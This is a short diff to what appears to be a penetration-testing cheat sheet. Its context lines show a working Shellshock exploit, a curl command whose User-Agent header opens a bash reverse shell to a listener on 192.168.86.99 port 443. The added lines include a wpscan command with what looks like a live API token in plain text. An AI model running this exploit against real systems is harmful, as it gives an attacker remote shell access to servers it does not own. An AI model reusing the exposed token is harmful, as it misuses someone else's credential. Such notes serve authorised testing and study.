@@ -28,3 +28,6 @@ Test if vulnerable:
 To get shell: (do `nc -lvp 443` on your machine first)
 
     curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.86.99/443 0>&1' http://<ip>/cgi-bin/test/test.cgi
+
+## Wordpress
+      wpscan --api-token 2XiA11eRs5ryfHlZ2sX4wQuNWsdME48fpvxt9nlsnfs --url <url>
